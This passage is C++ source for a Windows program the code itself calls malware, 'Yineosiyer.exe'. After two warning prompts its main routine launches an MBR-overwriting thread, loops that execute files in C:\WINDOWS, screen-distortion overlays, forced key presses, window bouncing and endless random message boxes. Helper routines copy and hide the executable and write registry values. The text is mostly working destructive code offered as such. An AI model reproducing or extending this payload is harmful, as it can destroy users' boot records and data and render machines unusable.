    LPCWSTR pathde = L"C:\\WINDOWS\\*.dll";

    while (true) {
        HANDLE find = FindFirstFileW(path, &data);
        HANDLE find2 = FindFirstFileW(pathde, &data);

        ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);

        while (FindNextFileW(find, &data)) {
            ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
            Sleep(3000);
        }
    }
}

DWORD WINAPI payloadHA2(LPVOID lpParam) {
    WIN32_FIND_DATA data;
    LPCWSTR path = L"C:\\WINDOWS\\*.exe";
    LPCWSTR pathde = L"C:\\WINDOWS\\*.dll";

    while (true) {
        HANDLE find = FindFirstFileW(path, &data);
        HANDLE find2 = FindFirstFileW(pathde, &data);

        ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);

        while (FindNextFileW(find, &data)) {
            ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
            Sleep(500);
        }
    }
}

DWORD WINAPI payloadstfour(LPVOID lpParam) { // credits to malsteve
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HINSTANCE hInstance = GetModuleHandle(NULL);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);
    SIZE g_size;
    g_size.cx = w;
    g_size.cy = h;

    HDC hScreen = GetDC(0);
    HDC hLayer = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, g_size.cx, g_size.cy);
    (HBITMAP)SelectObject(hLayer, hBmp);

    int hw = w / 2;
    int hh = h / 2;



    POINT ptSrc = { 0,0 };
    POINT ptPos = { 0,0 };

    SetStretchBltMode(hLayer, COLORONCOLOR);

    MSG four;
    while (true)
    {
        StretchBlt(hLayer, 0, 0, hw, hh, hScreen, 0, 0, w, h, SRCCOPY);
        StretchBlt(hLayer, hw, 0, hw, hh, hScreen, 0, 0, w, h, SRCCOPY);
        StretchBlt(hLayer, 0, hh, hw, hh, hScreen, 0, 0, w, h, SRCCOPY);
        StretchBlt(hLayer, hw, hh, hw, hh, hScreen, 0, 0, w, h, SRCCOPY);

        UpdateLayeredWindow(hwnd, hScreen, &ptPos, &g_size, hLayer, &ptSrc, 0, NULL, ULW_OPAQUE);
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);
    }

    return 0;
}


VOID PressKey(WORD key, INT time)
{
    INPUT pInputs = { 0 };

    pInputs.type = INPUT_KEYBOARD;
    pInputs.ki.wVk = key;

    //PRESS KEY
    SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));

    Sleep(time);

    pInputs.ki.dwFlags = KEYEVENTF_KEYUP;

    //FREE KEY
    SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));
}

DWORD WINAPI KeyboardPayload(LPVOID lpvd)
{
    while (true)
    {
        PressKey(VK_CAPITAL, 320);
        PressKey(VK_SCROLL, 320);
    }

    return 0x00;
}

DWORD WINAPI KeyboardPayload2(LPVOID lpvd)
{
    while (true)
    {
        PressKey(VK_CAPITAL, 50);
        PressKey(VK_SCROLL, 50);
    }

    return 0x00;
}

VOID SetRegValue(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, LPBYTE lpData, DWORD cbData)
{
    HKEY phkResult;

    RegOpenKeyExW(hKey, lpSubKey, NULL, KEY_SET_VALUE, &phkResult);
    RegSetValueExW(phkResult, lpValueName, NULL, dwType, lpData, sizeof(lpData) * cbData);
    RegCloseKey(phkResult);
}

//Get the current path where the program was executed (includes .exe)
LPCWSTR GetCurrentFileDir()
{
    WCHAR buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);

    return (LPCWSTR)buffer;
}

//Idk why I created this while I could just use CopyFileW lol
VOID CopyMalwareFile(LPCWSTR orgPathFile, WCHAR dstPathFile[])
{
    CopyFileW(orgPathFile, dstPathFile, TRUE);
}

//Makes the file disappear like your dad!
VOID HideFile(LPCWSTR orgPathFile)
{
    SetFileAttributesW(orgPathFile, FILE_ATTRIBUTE_HIDDEN);
}

//Returns a date element (day, month, year)
INT CheckDate(INT i)
{
    time_t t = time(0);
    tm date = *localtime(&t);

    if (i == 0) i = date.tm_mday; //1-31
    if (i == 1) i = date.tm_mon;  //0-11
    if (i == 2) i = date.tm_year; //XXXX

    //Actually the return value for the year is
    //The year of the system - 1900. 

    return i;
}

DWORD WINAPI window_bounce(LPVOID lpParam) //credits to lvy_x86, ultradasher
{
    int x = 0;
    int y = 0;
    int signX = 1;
    int signY = 1;
    int incrementor = 10;
    while (1)
    {
        HWND hwnd = GetForegroundWindow();
        x += incrementor * signX;
        y += incrementor * signY;
        SetWindowPos(hwnd, 0, x, y, x, y, SWP_NOSIZE);
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
            signY = -1;
        }
        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }
        if (y == 0)
        {
            signY = 2;
        }
        if (x == 0)
        {
            signX = 2;
        }
        Sleep(10);
        DeleteObject(hwnd);
    }
}

LPCWSTR string_randomizer_asfg(int len) {
    wchar_t* string = new wchar_t[len + 1];
    for (int i = 0; i < len; i++) {
        string[i] = (rand() % 256) + 1024;
    }
    string[len] = L'\0';
    return string;
}

DWORD WINAPI msgkill(LPVOID lpParam) { // credits to lvy_86x ultradasher965
    UINT icon = 0;
    UINT button = 0;
    UINT enableRtlReading = 0;
    LPCWSTR title = 0;

    while (1) {
        int iconfx = 1 + rand() % 8;
        int buttonfx = 1 + rand() % 9;
        int titlefx = 1 + rand() % 8;
        int enableRtlReadfx = 1 + rand() % 2;

        MessageBoxW(NULL, string_randomizer_asfg(rand() % 256), title, button | icon | enableRtlReading);

        if (titlefx == 1) title = L"YIENEEINESISI";
        if (titlefx == 2) title = L"stopify";
        if (titlefx == 3) title = L"x0runrespond2";
        if (titlefx == 4) title = L"Malsteve hates N17Pro3426";
        if (titlefx == 5) title = L"'noskid' pankoza";
        if (titlefx == 6) title = L"mr endolfin super endolfin";
        if (titlefx == 7) title = L"PC TRASHED";
        if (titlefx == 8) title = L"whoever read this first is gay";

        if (iconfx == 1) icon = MB_ICONWARNING;
        if (iconfx == 2) icon = MB_ICONERROR;
        if (iconfx == 3) icon = MB_ICONQUESTION;
        if (iconfx == 4) icon = MB_ICONINFORMATION;
        if (iconfx == 5) icon = MB_ICONEXCLAMATION;
        if (iconfx == 6) icon = MB_ICONASTERISK;
        if (iconfx == 7) icon = MB_ICONSTOP;
        if (iconfx == 8) icon = MB_ICONHAND;

        if (buttonfx == 1) button = MB_ABORTRETRYIGNORE;
        if (buttonfx == 2) button = MB_HELP;
        if (buttonfx == 3) button = MB_YESNOCANCEL;
        if (buttonfx == 4) button = MB_CANCELTRYCONTINUE;
        if (buttonfx == 5) button = MB_RETRYCANCEL;
        if (buttonfx == 6) button = MB_OK;
        if (buttonfx == 7) button = MB_OKCANCEL;
        if (buttonfx == 8) button = MB_YESNO;

        if (enableRtlReadfx == 1) button = 0;
        if (enableRtlReadfx == 2) button = MB_RTLREADING;
    }
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
        if (MessageBoxW(0, L"ahh your here. you are about to run a malware which x0rUnrespond2/x0rliners is not reponsible for any data loss or any damages to your computer.\nare you sure you want to execute this malware?", L"Yineosiyer.exe by x0runrespond2", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
        if (MessageBoxW(0, L"this is your final warning\nit can kill the system or open windows systems or damages to your data. are you sure?", L"Yineosiyer.exe - Final Warning", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
        CreateThread(0, 0, MBROverwriter, 0, 0, 0);
        CreateThread(0, 0, payloadHA, 0, 0, 0);
        CreateThread(0, 0, window_bounce, 0, 0, 0);
        HANDLE threadstt = CreateThread(0, 0, payloadstfour, 0, 0, 0);
        HANDLE key = CreateThread(0, 0, KeyboardPayload, 0, 0, 0);
        Sleep(15000);
        TerminateThread(threadstt, 0);
        CloseHandle(threadstt);
        TerminateThread(key, 0);
        CloseHandle(key);
        CreateThread(0, 0, KeyboardPayload2, 0, 0, 0);
        HANDLE thread = CreateThread(0, 0, payload1, 0, 0, 0);
        sound1(48000, 30);
        TerminateThread(thread, 0);
        CloseHandle(thread);
        RedrawWindow(0, 0, 0, 133);
        Sleep(100);
        HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
        sound2(48000, 30);
        TerminateThread(thread2, 0);
        CloseHandle(thread2);
        RedrawWindow(0, 0, 0, 133);
        Sleep(100);
        HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
        sound3(48000, 30);
        TerminateThread(thread3, 0);
        CloseHandle(thread3);
        RedrawWindow(0, 0, 0, 133);
        Sleep(100);
        HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
        sound4(48000, 30);
        TerminateThread(thread4, 0);
        CloseHandle(thread4);
        RedrawWindow(0, 0, 0, 133);
        Sleep(100);
        HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
        sound5(48000, 30);
        TerminateThread(thread5, 0);
        CloseHandle(thread5);
        RedrawWindow(0, 0, 0, 133);
        Sleep(100);
        HANDLE threadfinal = CreateThread(0, 0, payloadfinal, 0, 0, 0);
        sound6(44100, 30);
        TerminateThread(threadfinal, 0);
        CloseHandle(threadfinal);
        RedrawWindow(0, 0, 0, 133);
        Sleep(100);
        CreateThread(0, 0, payloadHA, 0, 0, 0);
        CreateThread(0, 0, unknownlol, 0, 0, 0);
        CreateThread(0, 0, msgkill, 0, 0, 0);
    }
